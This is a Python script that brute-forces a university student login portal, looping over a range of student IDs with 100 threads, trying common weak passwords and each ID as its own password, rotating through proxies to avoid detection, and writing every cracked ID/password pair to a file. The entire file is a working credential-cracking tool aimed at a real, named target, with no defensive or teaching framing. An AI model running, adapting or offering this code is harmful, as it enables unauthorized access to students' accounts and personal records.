import requests
from threading import Thread, Lock
import json
import random
from time import sleep
from TaskManager.TaskManager import task_partition, task_manager

ProxyFile = '../ProxyFetcher/res/proxy.txt'
lock = Lock()
# BaseUrl = 'http://urp.ecust.edu.cn/userPasswordValidate.portal'
BaseUrl = 'http://202.120.108.14/ecustedu/K_StudentQuery/K_StudentQueryLogin.aspx'
Proxies = list()
Passwords = ['123456', '654321', '111111']
Passports = list()
OnRun = {'timeout': 2, 'sleep': 0}
ThreadStatus = dict()
TargetFile = 'res/2015jwc.txt'


def cracker(tid: int, id_begin: int, id_end: int):
    # form_data = {
    #     'Login.Token1': '',
    #     'Login.Token2': '',
    #     'goto': 'http://urp.ecust.edu.cn/loginSuccess.portal',
    #     'gotoOnFail': 'http://urp.ecust.edu.cn/loginFailure.portal'
    # }
    form_data = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__VIEWSTATE': '/wEPDwUJMTg2MzE1NTYyD2QWAgIBD2QWAgIGDw8WAh4EVGV4dAUh5a+G56CB6ZSZ6K+v77yM6K+36YeN5paw6L6T5YWl77yBZGRkFxvnphCw9sD6HKP+GdRiY1Fc/V8=',
        'TxtStudentId': '',
        'TxtPassword': '',
        'BtnLogin': '登录',
        '__EVENTVALIDATION': '/wEWBAL/hrOXBgK/ycb4AQLVqbaRCwLi44eGDPi5GUVsIT4XMnZze86vrNckRZKd'
    }
    uid = id_begin
    while uid < id_end:
        sleep(OnRun['sleep'])
        # form_data['Login.Token1'] = '%06d' % uid
        form_data['TxtStudentId'] = '%06d' % uid

        for pwd in Passwords + [form_data['TxtStudentId']]:
            form_data['TxtPassword'] = pwd
            try:
                r = requests.get(BaseUrl,
                                 form_data,
                                 proxies=dict(http=random.choice(Proxies)),
                                 timeout=OnRun['timeout']).text
            except:
                continue
            if len(r) > 2 and r[1] == 's':
                print('ID:%s CODE:%s' % (form_data['TxtStudentId'], form_data['TxtPassword']))
                with lock:
                    Passports.append(dict(id=form_data['TxtStudentId'], code=form_data['TxtPassword']))
                break
        with lock:
            ThreadStatus[tid] = (uid - id_begin) / (id_end - id_begin)
        uid += 1
    with lock:
        ThreadStatus[tid] = 1.0


if __name__ == '__main__':
    with open(ProxyFile, 'r') as f:
        Proxies = json.load(f)

    partitions = task_partition(10150001, 10153800, 100)
    total_threads = len(partitions)
    threads = list()
    for tid in range(total_threads):
        threads.append(Thread(target=cracker, args=(tid, partitions[tid][0], partitions[tid][1],)))
    threads.append(Thread(target=task_manager, args=(total_threads, lock, ThreadStatus, OnRun)))
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    with open(TargetFile, 'w') as file:
        json.dump(Passports, fp=file)
